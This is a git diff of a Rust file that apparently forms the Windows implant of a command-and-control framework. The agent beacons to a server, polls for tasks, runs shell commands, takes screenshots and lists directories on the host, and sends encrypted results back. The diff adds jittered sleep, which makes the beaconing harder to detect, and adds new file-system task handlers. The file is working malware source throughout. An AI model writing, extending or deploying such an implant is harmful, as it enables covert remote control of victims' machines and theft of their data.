@@ -1,8 +1,10 @@
 // References:
 //  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
 //  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
+use regex::Regex;
 use std::{thread, time};
 use windows::core::{Error, HSTRING};
+use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
 
 use crate::{
     core::{
@@ -19,12 +21,10 @@ use crate::{
     },
     Config,
     crypto::aesgcm::{cipher, decipher, EncMessage},
-    utils::random::random_name,
+    utils::random::{random_name, random_sleeptime},
 };
 
 pub async fn run(config: Config) -> Result<(), Error> {
-    let sleep = time::Duration::from_secs(config.sleep);
-
     let user_agent = HSTRING::from(config.listener.user_agent.to_string());
 
     let hsession = HSession::new(user_agent)?;
@@ -62,7 +62,9 @@ pub async fn run(config: Config) -> Result<(), Error> {
     // Agent registration process
     let mut registered = false;
     while !registered {
-        thread::sleep(sleep);
+        thread::sleep(
+            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+        );
     
         // Register agent
         let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
@@ -85,7 +87,9 @@ pub async fn run(config: Config) -> Result<(), Error> {
     loop {
         // TODO: Implement graceful shutdown.
 
-        thread::sleep(sleep);
+        thread::sleep(
+            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+        );
 
         // Get task
         let task = match post(&mut hconnect, "/t/a".to_owned(), plaindata_json.to_string()).await {
@@ -120,51 +124,133 @@ pub async fn run(config: Config) -> Result<(), Error> {
         }
 
         match task_args[0].as_str() {
+            "cd" => {
+                match std::env::set_current_dir(task_args[1].as_str()) {
+                    Ok(result) => {
+                        post_task_result(
+                            &mut hconnect,
+                            "The current directory chanted successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
+            "ls" => {
+                match std::fs::read_dir(task_args[1].as_str()) {
+                    Ok(result) => {
+                        let re = Regex::new(r"\\").unwrap();
+
+                        let mut output = String::new();
+                        output = output + "\n";
+                        for path in result {
+                            if let Ok(entry) = path {
+                                let entry_name = &entry.path().to_string_lossy().to_string();
+                                let entry_name_2 = re.replace_all(entry_name, "/");
+                                let entry_name_3 = entry_name_2.split("/").last().unwrap().to_string();
+
+                                if let Ok(metadata) = entry.metadata() {
+                                    output = output + format!(
+                                        "{:<20} {}\n", entry_name_3, metadata.len()).as_str();
+                                } else {
+                                    output = output + format!(
+                                        "{}", entry_name_3).as_str();
+                                }
+                            }
+                        }
+
+                        post_task_result(
+                            &mut hconnect,
+                            output.as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
+            "pwd" => {
+                match std::env::current_dir() {
+                    Ok(result) => {
+                        post_task_result(
+                            &mut hconnect,
+                            &result.to_str().unwrap().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
             "screenshot" => {
                 match screenshot().await {
                     Ok(result) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
+                            &mut hconnect,
                             &result,
+                            agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+                        ).await;
                     }
                     Err(e) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
+                            &mut hconnect,
                             e.to_string().as_bytes(),
+                            agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+                        ).await;
                     }
                 }
             }
             "shell" => {
                 match shell(task_args[1..].join(" ")).await {
                     Ok(result) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
+                            &mut hconnect,
                             &result,
+                            agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+                        ).await;
                     }
                     Err(e) => {
-                        let cipherdata = CipherData::new(
-                            agent_name.to_string(),
+                        post_task_result(
+                            &mut hconnect,
                             e.to_string().as_bytes(),
+                            agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
-                        );
-                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
-                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+                        ).await;
                     }
                 }
             }
@@ -274,6 +360,23 @@ async fn post(
     Ok(response)
 }
 
-fn close_handler(h: &mut HInternet) {
-    h.close();
+async fn post_task_result(
+    hconnect: &mut HConnect,
+    result: &[u8],
+    agent_name: String,
+    my_secret_key: StaticSecret,
+    server_public_key: PublicKey,
+) {
+    let cipherdata = CipherData::new(
+        agent_name,
+        result,
+        my_secret_key,
+        server_public_key,
+    );
+    let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+    post(hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
 }
+
+// fn close_handler(h: &mut HInternet) {
+//     h.close();
+// }
